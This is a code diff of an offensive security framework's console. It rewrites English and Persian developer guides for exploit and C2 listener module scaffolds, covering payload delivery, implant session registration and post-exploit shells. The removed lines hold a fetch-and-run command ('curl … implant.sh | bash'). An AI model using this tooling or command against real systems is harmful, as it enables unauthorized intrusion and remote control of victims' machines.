@@ -9,7 +9,6 @@ import traceback
 import shutil
 import glob
 import getpass
-import importlib.util
 
 try:
     import readline
@@ -80,82 +79,97 @@ _TRUST_COLOR = {
 
 _MODULE_SCAFFOLDS = {
     "exploit": {
-        "en": '''"""
-__NAME__ — EXPLOIT module — developer field guide
-THE CONTRACT — the framework requires exactly two names:
-  * OPTIONS   : {KEY: {"value": default, "required": bool, "desc": str}}
-                `set KEY value` fills these; required keys are validated
-                automatically BEFORE run() fires. Extra keys: "kind"
-                ("payload" = framework-managed field) and "types".
-  * run(opts) : receives {KEY: value}. Everything else optional.
+        "en": r'''"""
+__NAME__ — EXPLOIT module — the complete zero-to-100 developer guide
+=====================================================================
 
-INJECTED BY THE FRAMEWORK (inside run, zero setup):
+WHAT AN EXPLOIT IS HERE
+  EXPLOIT = DELIVERY MECHANISM. Eidolon owns the chain up to the moment of
+  execution; you own every line after that. Zero limits on style: memory
+  corruption, deserialization, injection, auth bypass, logic bugs — the
+  framework never judges and never mediates.
+
+PART 1 — THE CONTRACT (the framework requires exactly two names)
+  * OPTIONS  : {KEY: {"value": default, "required": bool, "desc": str}}
+               - `set KEY value` fills them in the console; values are shown
+                 by `options`.
+               - required keys are validated automatically BEFORE run() runs.
+               - optional extra keys: "kind": "payload" + "types": (...) for
+                 a framework-managed payload field (see PART 3, step 4).
+  * run(opts): receives {KEY: value}. Plain def or async def.
+               Everything except OPTIONS+run is optional sugar.
+  Optional hooks: on_load() (once at load, cheap + safe only) and stop()
+  (`kill <id>` calls it — without it a long-running module is unkiltable).
+
+PART 2 — WHAT THE FRAMEWORK INJECTS INSIDE run() (zero setup)
   opts              {KEY: value} — resolved option values
-  EIDOLON_GLOBALS   shared global dict — setg/globals; persist small state
+  EIDOLON_GLOBALS   shared global dict — persist small state across modules
   EIDOLON_SHELL     the live console instance (internal API — sparingly)
   __eidolon_path__  absolute path of this file (resolve siblings from it)
 
-DEPENDENCIES: pip names in REQUIREMENTS — DISPLAYED (`deps`), NEVER installed
-  (supply-chain safety). The operator runs:  pip install <name>
+PART 3 — WRITING AN EXPLOIT FROM ZERO (the exact recipe)
+  1. Keep the layout free: this entry script is the only file the scanner
+     knows; put raw sources/tools next to it or in _src/ (dirs starting
+     with "_" or "." stay invisible to the scanner). Resolve siblings from
+     __eidolon_path__.
+  2. Declare OPTIONS for every knob the operator must touch — and NOTHING
+     else. Required keys are things without which a run is nonsense (e.g.
+     target). Validate deeper invariants inside run() yourself: the
+     framework checks presence, your bug's mechanics are YOUR business.
+  3. Implement run(opts):
+       - validate target/payload yourself (step 2 above);
+       - every network call gets an explicit timeout — report failures via
+         err(str(e)), never crash the console;
+       - never eval/exec; filesystem access via whitelists + realpath.
+  4. To receive a payload from the typed store, add to OPTIONS:
+         "payload": {"value": "", "required": False, "desc": "…",
+                     "kind": "payload",
+                     "types": ("file-posix", "file-win", "shellcode", "cmd", "code")}
+     `set payload <name-or-path>` then resolves LIVE against the store and
+     run() receives a manifest DICT with "path" in it. Raw paths pass as
+     type "external". Under the hood: eidolon.wraith.store.resolve_payload().
+  5. PayLOAD FREEDOM — what you deliver is yours + operator's: raw file,
+     shellcode, shell one-liner, generated source, multi-stage anything.
+     The four classic shapes are ADVISORY PATTERNS, not a contract:
+       SHELLCODE_PATH  arch/badchars/maxsize are YOUR bug's consequences
+       PAYLOAD_FILE    compiled artifact dropped/uploaded on the target
+       CMD             shell line (bash/zsh/cmd/…) — quoting is your business
+       PAYLOAD_SRC     source an interpreter on the target executes
+     Nothing is ever staged in temp copies: the operator gives absolute or
+     relative paths, or a store name. Any C2 is legit: Sliver, a Wraith
+     listener module, whatever comes next.
+  6. (optional) After the break-in, hand the operator into your own shell:
+         EIDOLON_SHELL.enter_subshell(handler, completer=fn, prompt_fn=fn,
+                                      on_exit=fn)
+     The completer gives FULL TAB COMPLETION inside; exploit sessions are
+     auto-logged in the workspace DB.
+  7. (optional) Advisory identity block: RANK (excellent > great > good >
+     normal > average > low > manual), TARGETS (OS/arch/version ranges),
+     REFERENCES (CVE ids, writeups). Displayed by `info`/repo views; never
+     enforced.
 
-TRUST (TOFU): fresh modules start UNTRUSTED:
-      trust <name> → use <name> → set KEY value → run
-  First run is recorded; later edits flip it to "modified" until re-trust.
+PART 4 — THE OPERATOR FLOW (every console step, zero to 100)
+      new_module myexp exploit      -> scaffold, UNTRUSTED (TOFU)
+      trust myexp                   -> hash recorded
+      use myexp                     -> shows OPTIONS
+      set target <host>             -> required keys validated on run
+      run                           -> the break-in (foreground)
+  with a store payload:
+      gen mybldr                    -> select a builder
+      set …                         -> build-time params
+      run                           -> registers the artifact, prints store path
+      c2 payloads                   -> the store listing
+      use myexp ; set payload mybldr-product ; run
+  long-running exploits land as background jobs: `jobs` / `kill <id>`.
+  after a foothold: post-exploit modules own recon/escalation; type `shell`
+  to hand the operator into the selected module's interactive channel.
 
-LIFECYCLE HOOKS (optional):
-  on_load()  once at load — cheap + safe only.
-  stop()     long-running modules: clean halt (sockets/loops). `kill <id>`
-             calls it; no stop() = cannot be killed.
-
-HOUSE STYLE:
-  * speak to the operator only via eidolon.utils (ok/err/info/warn/spectral).
-  * network: explicit timeout always; report str(err) through err().
-  * filesystem: whitelists + realpath containment; never eval/exec.
-  * artifacts with real keys are written 0o600.
-
-EXPLOIT = DELIVERY MECHANISM. Eidolon owns the chain up to execution; you own
-everything after. Zero limits on style: memory corruption, deserialization,
-injection, auth bypass, logic bugs — the framework never judges.
-
-PAYLOAD FREEDOM (the deepest rule): what is delivered is yours + operator's —
-raw file, shellcode, shell one-liner, generated source, multi-stage anything.
-The four classic shapes are ADVISORY PATTERNS, not a contract:
-  SHELLCODE_PATH  arch/badchars/max size are YOUR bug's consequences
-  PAYLOAD_FILE    compiled artifact dropped/uploaded on the target
-  CMD             shell line (bash/zsh/cmd/…) — quoting is your business
-  PAYLOAD_SRC     source an interpreter on the target executes
-Delivery paths are what the operator types into the info page — absolute or
-relative (./payload, C:\\\\tmp\\\\i.exe). Nothing is ever staged in temp copies.
-The classic cmd shape: host the artifact anywhere, then CMD carries
-  curl https://your.host/implant.sh | bash
-EXTERNAL C2s are EQUAL-FOOTING sources, zero wiring: point CMD/PAYLOAD_FILE
-at a Sliver/MSF artifact and the module delivers it — the typed store acts
-as just one more external source whose 'automation' (the manifest dict) is
-granted ONLY by an explicit operator command (set payload <name-or-path>).
-The framework never chooses, fetches, or stages anything on its own.
-Any C2 is legit: Sliver, a Wraith listener module, whatever comes next.
-
-THE DEDICATED PAYLOAD FIELD (typed store, type-checked on set):
-  `"kind": "payload"` + `"types": (...)` in OPTIONS — `set payload <ref>`
-  resolves LIVE against the store; run() receives a manifest DICT with
-  "path" inside. Raw paths pass as type "external". Under the hood:
-  eidolon.wraith.store.resolve_payload().
-
-INTERACTIVE SHELL AFTER BREAK-IN (optional): hand the console to your own
-  shell — EIDOLON_SHELL.enter_subshell(handler, completer=fn, prompt_fn=fn,
-  on_exit=fn). completer gives FULL TAB COMPLETION inside; exploit sessions
-  are auto-logged in the workspace DB.
-
-MODULE IDENTITY (advisory metadata — displayed by `info`/`repo`, never enforced):
-  RANK        quality grade: excellent > great > good > normal > average > low > manual
-  TARGETS     what this applies to: ("linux/x86_64", "nginx 1.18-1.20"), versions, ranges
-  REFERENCES  advisories: CVE ids, writeups, vendor notes
-
-POST-EXPLOIT HANDOFF: your break-in is only phase 1 — post-exploit modules
-  (type "post-exploit") own everything after: full recon + escalation, and a
-  `shell` command that takes the interactive channel FROM a listener
-  (negotiated dialect: raw bash, cmd, anything agreed). Deliver the foothold,
-  they take it from there.
+PART 5 — CHECKLIST BEFORE YOU CALL IT DONE
+  [ ] every socket has an explicit timeout
+  [ ] errors leave via err(str(e)) — the console never dies
+  [ ] no eval/exec, no temp staging for artifacts
+  [ ] required OPTIONS are minimal and meaningful
+  [ ] shell crafted? completer covers every verb your payload speaks
 """
 
 from eidolon.utils import ok, err, info, warn, spectral
@@ -172,7 +186,6 @@ TARGETS     = []            # what this applies to: ("linux/x86_64", "nginx 1.18
 REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes
 
 PAYLOAD_KIND = "file"       # display-only: shellcode | file | cmd | code | none
-REQUIREMENTS = []           # pip names — DISPLAYED by `deps`, never installed
 
 OPTIONS = {
     "target": {
@@ -229,79 +242,92 @@ def run(opts):
 
     ok("__NAME__ finished (scaffold — no real operation yet)")
 ''',
-        "fa": '''"""
-__NAME__ — EXPLOIT module — developer field guide
-قرارداد — فریم‌ورک فقط دو اسم را لازم دارد:
-  * OPTIONS   : {کلید: {"value": پیش‌فرض, "required": بول, "desc": توضیح}}
-                `set کلید مقدار` این‌ها را پر می‌کند؛ کلیدهای required پیش از
-                run() خودکار اعتبارسنجی می‌شوند. کلیدهای اضافی: "kind"
-                ("payload" = فیلد اختصاصیِ مدیریت‌شده) و "types".
-  * run(opts) : مقدار {کلید: مقدار} می‌گیرد؛ بقیه اختیاری.
+        "fa": r'''"""
+__NAME__ — ماژول EXPLOIT — راهنمای کامل صفر تا صد توسعه‌دهنده
+=====================================================================
 
-توسط فریم‌ورک تزریق می‌شود (داخل run، بدون تنظیم):
-  opts              {کلید: مقدار} — مقادیر گزینه‌ها
-  EIDOLON_GLOBALS   دیکشنری سراسری مشترک — setg/globals
+اکسپلویت در اینجا یعنی چه
+  اکسپلویت فقط «وسيله‌ی تحويل» است. فریم‌ورک زنجيره را تا لحظه‌ی اجرا مصرف
+  می‌کند؛ بقيه با توست. هيچ محدوديتی روی سبک نيست: خرابی حافظه، تزريق،
+  دور‌زدن احراز هويت، باگ منطقی — فريم‌ورک داوری نمی‌کند و میانجی نمی‌شود.
+
+بخش ۱ — قرارداد (فریم‌ورک فقط دو نام لازم دارد)
+  * OPTIONS  : {کلیدی: {"value": پیشفرض, "required": بول, "desc": توضیح}}
+               - در کنسول با `set کلید مقدار` پر می‌شوند؛ `options` آنها را
+                 نشان می‌دهد.
+               - کلیدهای required قبل از اجرا شدن run() خودکار کنترل می‌شوند.
+               - کلیدهای اضافی اختیاری: "kind": "payload" + "types": (…)
+                 برای یک فیلد پیلودِ مدیریته‌شده (بخش ۳، گام ۴).
+  * run(opts): {کلیدی: مقدار} می‌گیرد. def ساده یا async def.
+  قلاب‌های اختیاری: on_load() (یک بار در لود، ارزان و بی‌خطر) و stop()
+  ‏(`kill <id>` صدایش می‌زند — بدون آن ماژول طولانی‌مدت کشتنی نیست).
+
+بخش ۲ — فریم‌ورک داخل run() چه چیزهایی تزریق می‌کند (بدون هیچ تنظیمی)
+  opts              {کلید: مقدار} — مقادیر حل‌شده‌ی گزینه‌ها
+  EIDOLON_GLOBALS   دیکشنری سراسری مشترک — نگهداری حالت کوچک بین ماژول‌ها
   EIDOLON_SHELL     نمونه‌ی زنده‌ی کنسول (API داخلی — کم و حساب‌شده)
-  __eidolon_path__  مسیر مطلق همین فایل (هم‌پوشه‌ها را از این حل کن)
+  __eidolon_path__  مسیر مطلق همین فایل (هم‌پوشه‌ها را از روی آن حل کن)
 
-وابستگی‌ها: اسم‌های pip در REQUIREMENTS — فقط «نمایش» (`deps`)، هرگز نصب
-  خودکار (امنیت زنجیره‌ی تأمین). اپراتور خودش:  pip install <name>
+بخش ۳ — نوشتن اکسپلویت از صفر، گام به گام
+  ۱. چیدمان آزاد است: فقط همین اسکریپت ورودی را اسکنر می‌شناسد؛ سورس‌ها و
+     ابزارها را کنارش یا در _src/ بگذار (پوشه‌هایی که با "_" یا "." شروع
+     شوند برای اسکنر نامرئی‌اند). هم‌پوشه‌ها را از __eidolon_path__ حل کن.
+  ۲. برای هر پیچی که اپراتور باید بچرخاند OPTIONS اعلام کن — و نه بیشتر.
+     کلیدهای required فقط چیزهایی باشند که بدونشان اجرا بی‌معنی است
+     (مثلاً target). فریم‌ورک فقط «بودن» را چک می‌کند؛ مکانیک باگِ توست،
+     اعتبارسنجی عمیق را خودت داخل run() انجام بده.
+  ۳. پیاده‌سازی run(opts):
+       - target و پیلود را خودت اعتبارسنجی کن (گام ۲)؛
+       - هر فراخوانی شبکه timeout صریح داشته باشد — خطا با err(str(e))
+           برگردد، کنسول هرگز نباید بمیرد؛
+       - هرگز eval/exec؛ دسترسی فایل فقط با وایت‌لیست + مهار realpath.
+  ۴. برای رسیدن پیلود از انبارِ تایپ‌دار، در OPTIONS اضافه کن:
+         "payload": {"value": "", "required": False, "desc": "…",
+                     "kind": "payload",
+                     "types": ("file-posix", "file-win", "shellcode", "cmd", "code")}
+     سپس `set payload <نام-یا-مسیر>` همان لحظه روی انبار resolve می‌شود و
+     run() یک مانیفست DICT با "path" دریافت می‌کند. مسیر خام با تایپ
+     "external" می‌گذرد. زیرِ آن: eidolon.wraith.store.resolve_payload().
+  ۵. آزادی پیلود — آنچه تحویل می‌شود تصمیم تو و اپراتور است: فایل خام،
+     شل‌کد، خط فرمان، سورس تولیدی، دانلودر چندمرحله‌ای — هر چه بخواهی.
+     چهار مدل کلاسیک فقط «الگوی مشورتی»‌اند، نه قرار داد:
+       SHELLCODE_PATH  معماری/بدکاراکترها/سقف سایز برخاسته از باگِ «تو»ست
+       PAYLOAD_FILE    آرتیفکت کامپایل‌شده که روی هدف گذاشته می‌شود
+       CMD             خط شل (bash/zsh/cmd/…) — نقل‌قول‌ها با تو
+       PAYLOAD_SRC     سورسی که مفسر روی هدف اجرایش می‌کند
+     هیج‌وقت در پوشه‌های موقت stage نمی‌شود: مسیر مطلق/نسبی از اپراتور یا
+     نام انبار. هر C2 مشروع است: Sliver، ماژول لیستنر Wraith، هرچه فردا.
+  ۶. (اختیاری) بعد از ورود، کنسول را به شلِ خودت بسپار:
+         EIDOLON_SHELL.enter_subshell(handler, completer=fn, prompt_fn=fn,
+                                      on_exit=fn)
+     کامپلیتر داخلش تب‌کامپلیت کامل می‌دهد؛ سشن‌های اکسپلویت در دیتابیسِ
+     فضای کاری لاگ می‌شوند.
+  ۷. (اختیاری) بلوک هویت مشورتی: RANK (مرتبه‌ی کیفیت)، TARGETS (سیستم/معماری/
+     نسخه‌ی اعتبار)، REFERENCES (CVE، ویرایت‌آپ). فقط با `info`/repo نمایش
+     داده می‌شوند؛ هرگز اجرایی نیستند.
 
-اعتماد (TOFU): ماژول تازه UNTRUSTED است؛ جریان:
-      trust <name> ← use <name> ← set کلید مقدار ← run
-  اولین run ثبت می‌شود؛ ویرایشِ بعد از آن = "modified" تا re-trust.
+بخش ۴ — جریان اپراتور (تمام دستورهای کنسول، صفر تا صد)
+      new_module myexp exploit      <- اسکلت ساخته می‌شود، UNTRUSTED (TOFU)
+      trust myexp                   <- هش ثبت می‌شود
+      use myexp                     <- صفحه‌ی OPTIONS را نشان می‌دهد
+      set target <host>             <- مقادیر لازم
+      run                           <- ورود (پیش‌زمینه)
+  با پیلودِ انبار:
+      gen mybldr                    <- انتخاب بیلدر
+      set …                         <- پارامترهای ساخت
+      run                           <- آرتیفکت ثبت و مسیر انبار چاپ می‌شود
+      c2 payloads                   <- فهرست انبار
+      use myexp ؛ set payload <نام‌محصول> ؛ run
+  اکسپلویت‌های طولانی‌مدت خودکار job پس‌زمینه می‌شوند: `jobs` / `kill <id>`.
+  بعد از فوهولد: ماژول‌های post-exploit صاحب ریکون/ارتقایی‌اند؛ با `shell`
+  اپراتور را وارد کانال تعاملی آن ماژول کن.
 
-قلاب‌های چرخه (همه اختیاری):
-  on_load()  یک بار در لود — فقط ارزان و بی‌خطر.
-  stop()     توقف تمیز ماژول‌های طولانی‌مدت؛ `kill <id>` صدا می‌زند.
-
-شیوه‌ی خانه:
-  * با اپراتور فقط از eidolon.utils حرف بزن (ok/err/info/warn/spectral).
-  * شبکه: همیشه timeout صریح؛ گزارش خطا با err(str(err)).
-  * فایل‌سیستم: وایت‌لیست + مهار realpath؛ هرگز eval/exec.
-  * آرتیفکت حاوی کلید واقعی: با 0o600 نوشته شود.
-
-اکسپلویت فقط «وسیله‌ی تحویل» است. Eidolon زنجیره را تا لحظه‌ی اجرا مصرف
-می‌کند؛ بقیه دست توست. هیچ محدودیتی روی سبک: خرابی حافظه، تزریق، دور‌زدن
-احراز هویت، باگ منطقی — فریم‌ورک داوری نمی‌کند.
-
-آزادی پی‌لود (عمیق‌ترین قانون): آنچه تحویل می‌شود تصمیمِ تو و اپراتور است —
-فایل خام، شل‌کد، خط فرمان، سورس تولیدی، دانلودر چندمرحله‌ای. چهار مدل
-کلاسیک فقط «الگوی مشورتی»‌اند، نه قرارداد:
-  SHELLCODE_PATH  معماری/بدکاراکترها/سقف سایز برخاسته از باگِ «تو»ست
-  PAYLOAD_FILE    آرتیفکت کامپایل‌شده که روی هدف گذاشته می‌شود
-  CMD             خط شل (bash/zsh/cmd/…) — نقل‌قول‌ها با تو
-  PAYLOAD_SRC     سورسی که مفسر روی هدف اجرا می‌کند
-مسیرهای تحویل همان چیزی است که اپراتور در صفحه‌ی info تایپ می‌کند — مطلق یا
-نسبی (./payload). هیچ‌وقت کپی موقتی در کار نیست. شکل کلاسیک cmd: فایل را هرجا
-آپلود کن و CMD حامل باشد:
-  curl https://your.host/implant.sh | bash
-C2های خارجی در هم‌عرضِ مابقی‌اند، هیچ وایرینگی لازم نیست: CMD/PAYLOAD_FILE
-را به آرتیفکتِ Sliver یا MSF اشاره بده و ماژول تحویل می‌دهد — انبارِ تایپ‌دار
-فقط یکی دیگر از منابعِ خارجی است که 'اتوماسیونِ' آن (مانیفست dict) فقط با
-دستورِ صریحِ اپراتور اعطا می‌شود (set payload <name-یا-مسیر>). فریم‌ورک
-هرگز خودش انتخاب، fetch یا مرحله‌بندی نمی‌کند.
-هر C2 مشروع است: Sliver، ماژول لیسنر Wraith، هر چیزِ فردا.
-
-فیلد اختصاصی پی‌لود (انبار تایپ‌دار، روی set اعتبارسنجی):
-  در OPTIONS اعلان کن `"kind": "payload"` + `"types": (...)`؛ `set payload`
-  همان لحظه روی انبار resolve می‌شود و run() یک مانیفست DICT با "path"
-  می‌گیرد. مسیر خام با تایپ "external" می‌گذرد. زیرش:
-  eidolon.wraith.store.resolve_payload() — مستقیم هم صداپذیر.
-
-شل تعاملی بعد از ورود (اختیاری): کنسول را به شلِ خودت بسپار —
-  EIDOLON_SHELL.enter_subshell(handler, completer=fn, prompt_fn=fn, on_exit=fn)
-completer تَب‌کامپلیت کامل می‌دهد؛ سشن اکسپلویت داخل ساب‌شل در DB لاگ می‌شود.
-
-هویت ماژول (متادیتای مشورتی — توسط `info`/`repo` نمایش داده می‌شود، هرگز اجباری نیست):
-  RANK        مرتبه کیفیت: excellent > great > good > normal > average > low > manual
-  TARGETS     معتبر روی چه چیزی: ("linux/x86_64", "nginx 1.18-1.20")، نسخه‌ها، بره‌ها
-  REFERENCES  ارجاعات: CVE، ورایت‌آپ، یادداشت توسعه‌دهنده
-
-دستوردادی post-exploit: ورودِ تو فقط مرحلهِ ۱ است — ماژول‌های post-exploit
-(تایپ "post-exploit") مابقی را مدیریت می‌کنند: جمع‌آوری کامل داده + ارتقاِ دسترسی، و
-دستور `shell` که کانال تعاملی را از لیسنر می‌گیرد (لهجه توافقی: raw bash، cmd، هرچیز).
-فوهدلد را تحویل بده، بقیه با آن‌ها.
+بخش ۵ — چک‌لیست پیش از اعلام «تمام»
+  [ ] هر سوکت timeout صریح دارد
+  [ ] خطاها با err(str(e)) خارج می‌شوند — کنسول نمی‌میرد
+  [ ] eval/exec نیست، stage کردن در tmp نیست
+  [ ] OPTIONS حداقلی و با‌معنا است
+  [ ] شل داری؟ کامپلیتر هر فعلی را که پیلود می‌فهمد پوشش می‌دهد
 """
 
 from eidolon.utils import ok, err, info, warn, spectral
@@ -318,7 +344,6 @@ TARGETS     = []            # what this applies to: ("linux/x86_64", "nginx 1.18
 REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes
 
 PAYLOAD_KIND = "file"       # display-only: shellcode | file | cmd | code | none
-REQUIREMENTS = []           # pip names — DISPLAYED by `deps`, never installed
 
 OPTIONS = {
     "target": {
@@ -378,40 +403,104 @@ def run(opts):
     },
     "listener": {
         "en": r'''"""
-__NAME__ — LISTENER — the whole contract on one screen
+__NAME__ — LISTENER module — the complete zero-to-100 developer guide
+======================================================================
 
-THE FRAMEWORK ASKS FOR EXACTLY TWO NAMES — nothing else is a rule:
-  * OPTIONS    : {"KEY": {"value": default, "required": bool, "desc": str}}
-                 `set KEY value` fills them; required keys are checked
-                 automatically BEFORE run() fires.
-  * run(opts)  : plain def OR async def — BOTH first-class. async is the
-                 preferred style for servers: the framework runs the event
-                 loop for you, foreground or as a background job.
-  * stop()     : optional — `kill <id>` calls it; no stop() = unkiltable.
+WHAT A LISTENER IS HERE
+  A listener is 100% YOUR code: no framework listener, no transport, no
+  wire contract around you. Choose any transport (TCP / WS / HTTP / UDP /
+  gRPC ...), any wire format, any handshake. Shell, screenshot, upload,
+  keys — the capability set is whatever YOU and the payload agree on.
+  The kernel only offers the shelves (sessions + store) and never mediates.
 
-INJECTED INSIDE run(): opts (resolved values) · EIDOLON_GLOBALS (shared dict)
-· EIDOLON_SHELL (the console) · __eidolon_path__ (this file's path).
+PART 1 — THE CONTRACT (the framework requires exactly two names)
+  * OPTIONS  : {KEY: {"value": default, "required": bool, "desc": str}}
+               `set KEY value` fills them; required keys validated
+               automatically BEFORE run() fires. host/port are the natural
+               knobs; a port of 0 = let the OS pick a free one.
+  * run(opts): plain def OR async def — BOTH first-class. async is the
+               preferred style for servers: the framework runs the event
+               loop for you, foreground or as a managed background job.
+  * stop()   : optional but STRONGLY EXPECTED for listeners — `kill <id>`
+               and shutdown call it; without it the job is unkiltable.
+  Optional: on_load() (once at load — cheap + safe only).
 
-YOUR WORLD, ZERO CONTRACTS: any transport (TCP / WS / HTTP / UDP / gRPC —
-anything), any libraries (pip names in REQUIREMENTS — shown by `deps`,
-NEVER installed), any wire format, any handshake. NO protocol document
-exists between you and payloads: shell, screenshot, upload, keys — the
-capability set is whatever YOU and the payload agree on. The kernel only
-offers the shelves (sessions + store) and never mediates.
+PART 2 — WHAT THE FRAMEWORK INJECTS INSIDE run() (zero setup)
+  opts              {KEY: value} — resolved option values
+  EIDOLON_GLOBALS   shared global dict — persist small state
+  EIDOLON_SHELL     the live console instance (internal API — sparingly)
+  __eidolon_path__  absolute path of this file (resolve siblings)
+  (keep module imports minimal; import inside run() what you really need)
 
-THE FOUR MOVES (marked below):
-  1 SERVE    — start the engine; the OPTIONS keys are your knobs.
-  2 PROFILE  — publish: EIDOLON_SHELL.wraith_listener = <obj with .url/.token/.tags>
-  3 SESSIONS — on each connect: reg = eidolon.wraith.sessions.default_registry()
-               sess = reg.register(info, addr) · EIDOLON_SHELL._c2_on_event(("up", sess))
-  4 INTERACT — attach sess.interact = callable(EIDOLON_SHELL); `use <sid>` hands
-               the console to YOUR shell: sh.enter_subshell(on_line=fn,
-               completer=fn, prompt_fn=fn, on_exit=fn) — the completer gives
-               FULL TAB COMPLETION. The framework only resolves and steps aside.
+PART 3 — WRITING A LISTENER FROM ZERO: THE FOUR MOVES
+  MOVE 1 — SERVE
+      Start your engine. Threaded engines (socket per thread) and async
+      engines (asyncio) are both native; the full async version is below.
+      A blocking-forever run() is CORRECT: listener-type runs are
+      auto-backgrounded as managed jobs and `kill <id>` calls stop().
+      Every knob (host/port/tls/token file ...) comes from OPTIONS.
+      TLS is module business: terminate it yourself (ssl.SSLContext); the
+      framework never touches your listener's sockets.
+  MOVE 2 — PROFILE
+      Publish the connection point so payload builders can embed it:
+          EIDOLON_SHELL.wraith_listener = <obj with .url / .token / .tags>
+      .url is where the implant dials (e.g. tcp://10.4.2.9:51515), .token
+      is your shared secret material — the convention is entirely yours,
+      the store merely carries it (see the payload scaffold: the builder
+      bakes it into the artifact), .tags is a free-form tuple like
+      ("ws-json-async",) meaning only what YOU agree. With port=0 read the
+      ACTUAL bound port from the server object (shown below) — the url in
+      the profile must be a real (host:port) pair, complete and dialable.
+  MOVE 3 — SESSIONS (the only kernel call a connect needs)
+      After your handshake (your framing: hello json / magic bytes / none):
+          from eidolon.wraith.sessions import default_registry
+          reg  = default_registry()                 # or a private one
+          sess = reg.register({"sid": unique-id,     # required — from your hello
+                               "implant": "my-implant",
+                               "os": "linux", "arch": "x86_64",
+                               "user": "alice", "host": "corp-ws",
+                               "tags": TAGS}, addr=peer)
+          EIDOLON_SHELL._c2_on_event(("up", sess))   # instant console notice
+      The framework does nothing more: it registers, notifies, and lists
+      (`c2 sessions`). The session object carries: sess.sid/.implant/.os/
+      .arch/.user/.host/.status/.tags.
+  MOVE 4 — INTERACT (the `use <sid>` handoff)
+      sess.interact = callable(EIDOLON_SHELL) — when the operator types
+      `use <sid>` the console calls it and takes your shell:
+          def _enter(sh, sess, send):
+              sh.enter_subshell(on_line=send,           # typed line -> implant
+                                completer=_complete,    # FULL TAB COMPLETION
+                                prompt_fn=lambda: "%.4s ❯ " % sess.sid,
+                                on_exit=lambda: info("left session shell"))
+      The inner shell normalizes NOTHING: every verb (shell / upload /
+      screenshot / die ...) is your protocol. In async engines push the
+      line into the event loop with call_soon_threadsafe (below); in
+      threaded engines just close over the socket and send().
 
-TRUST: fresh modules start UNTRUSTED →  trust <name> → use → set → run.
-This scaffold runs out of the box on the STDLIB ONLY (asyncio TCP echo with
-the session shell wired) — swap in websocket / TLS / anything else freely.
+PART 4 — THE OPERATOR FLOW (zero to 100, every console step)
+      new_module mylsn listener ; trust mylsn ; use mylsn
+      set port 51515 ; run              -> auto-backgrounded as a job
+      jobs ; c2 sessions                -> the listener + sessions
+      (implant dials...)                -> "payload connected" via _c2_on_event
+      use <sid>                         -> YOUR subshell, tab completion included
+      back                              -> console; channel stays live
+      kill <id>                         -> stop() closes the server
+  payload side: `gen <payload module>` reads EIDOLON_SHELL.wraith_listener
+  (.url/.token/.tags) and bakes it into the artifact.
+
+PART 5 — SAFETY/HOUSE RULES THAT ALSO APPLY TO LISTENERS
+  * every network op has an explicit timeout; report str(err) via err().
+  * artifacts with real keys are written 0o600; nothing in temp storage.
+  * speak to the operator only through eidolon.utils
+    (ok/err/info/warn/spectral).
+  * never eval/exec; parse your wire format defensively (size caps).
+
+PART 6 — CHECKLIST BEFORE YOU CALL IT DONE
+  [ ] stop() closes every socket/loop — `kill <id>` really kills
+  [ ] register() called once per implant, sid unique and stable
+  [ ] sess.interact wired + _c2_on_event on "up" (and "down" on exit)
+  [ ] profile published BEFORE any builder runs
+  [ ] tab completion inside `use <sid>` reflects the real verb set
 """
 
 import asyncio
@@ -429,7 +518,6 @@ RANK        = "normal"      # quality grade: excellent > great > good > normal >
 TARGETS     = []            # what this applies to: ("linux/x86_64", "nginx 1.18-1.20"), versions, net ranges
 REFERENCES  = []            # advisories: CVE ids, writeups, vendor notes
 
-REQUIREMENTS = []           # e.g. ["websockets>=11"] — DISPLAYED, never installed
 
 OPTIONS = {
     "host": {"value": "0.0.0.0", "required": False, "desc": "bind address"},
@@ -513,39 +601,102 @@ def stop():
             pass
 ''',
         "fa": r'''"""
-__NAME__ — لیسنر — کل قرارداد روی یک صفحه
+__NAME__ — ماژول LISTENER — راهنمای کامل صفر تا صد توسعه‌دهنده
+======================================================================
 
-فریم‌ورک فقط دو اسم می‌خواهد — هیچ چیز دیگر قانون نیست:
-  * OPTIONS    : {"کلید": {"value": پیش‌فرض, "required": بول, "desc": توضیح}}
-                 `set کلید مقدار` این‌ها را پر می‌کند؛ کلیدهای required قبل از
-                 run() خودکار کنترل می‌شوند.
-  * run(opts)  : def ساده یا async def — هر دو درجه‌یک. async سبک مرجح برای
-                 سرورهاست: فریم‌ورک خودش حلقه‌ی رویداد را بالا می‌آورد، هم
-                 پیش‌ زمینه هم بک‌گراند (job).
-  * stop()     : اختیاری — `kill <id>` آن را صدا می‌زند؛ بدون stop() کشتن.
+لیستنر در اینجا یعنی چه
+  لیستنر ۱۰۰٪ کدِ خود توست: نه لیستنر فریم‌ورکی دارد، نه ترنسپورت، نه
+  قرارداد سیمیِ از پیش تعیین‌شده. هر ترنسپورتی (TCP / WS / HTTP / UDP /
+  gRPC …)، هر قالب سیمی، هر دست‌دادن. شل، اسکرین‌شات، آپلود، کلیدها —
+  مجموعه‌ی قابلیت‌ها دقیقاً توافقی است که «تو و پیلود» می‌کنید. هسته فقط
+  قفسه‌ها را می‌دهد (sessions + store) و هرگز میانجی نمی‌شود.
 
-تزریق‌شده داخل run(): opts (مقدارها) · EIDOLON_GLOBALS (دیک مشترک) ·
-EIDOLON_SHELL (کنسول) · __eidolon_path__ (مسیر همین فایل).
+بخش ۱ — قرارداد (فریم‌ورک فقط دو نام لازم دارد)
+  * OPTIONS  : {کلیدی: {"value": پیشفرض, "required": بول, "desc": توضیح}}
+               با `set کلید مقدار` پر می‌شوند؛ کلیدهای required قبل از
+               اجرای run() خودکار کنترل می‌شوند. host/port طبیعی‌ترین
+               پیچ‌ها هستند؛ port = 0 یعنی سیستم‌عامل یک پورت آزاد بدهد.
+  * run(opts): def ساده یا async def — هر دو درجه‌یک. برای سرورها async
+               سبک مرجح است: فریم‌ورک خودش حلقه‌ی رویداد را بالا می‌آورد،
+               پیش‌زمینه یا به‌صورت job مدیریت‌شده.
+  * stop()   : برای لیستنرها اختیاری ولی قویاً انتظار می‌رود — `kill <id>`
+               و خاموشی آن را صدا می‌زنند؛ بدون آن job کشتنی نیست.
+  اختیاری: on_load() (یک بار در زمان لود — فقط ارزان و بی‌خطر).
 
-دنیای تو، صفر قرارداد: هر ترنسپورتی (TCP / WS / HTTP / UDP / gRPC — هر چه)،
-هر کتابخانه‌ای (اسم pip در REQUIREMENTS — `deps` نمایش می‌دهد، هیچ‌وقت نصب
-نمی‌کند)، هر قالبِ سیمی، هر دست‌دادن. هیچ سند پروتکلی بین تو و پیلود نیست:
